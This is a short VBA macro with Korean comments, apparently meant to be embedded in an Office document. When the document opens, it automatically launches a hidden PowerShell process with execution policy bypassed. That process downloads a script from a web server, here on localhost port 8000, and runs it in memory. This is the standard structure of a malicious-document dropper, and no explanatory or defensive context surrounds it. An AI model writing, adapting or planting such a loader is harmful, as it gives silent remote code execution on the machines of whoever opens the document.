Private Sub Document_Open()
    RunPowerShellScriptInBackground
End Sub

Sub RunPowerShellScriptInBackground()
    Dim objShell As Object
    Dim cmdStr As String
    
    ' PowerShell 실행 명령어 설정
    cmdStr = "powershell.exe -WindowStyle Hidden -noexit -ep bypass -c IEX((New-Object System.Net.WebClient).DownloadString('http://127.0.0.1:8000/server.txt')) # "
    
    ' 새로운 Shell 객체 생성
    Set objShell = CreateObject("WScript.Shell")
    
    ' PowerShell 실행
    objShell.Run cmdStr, 0, False
    
    ' 객체 해제
    Set objShell = Nothing
End Sub


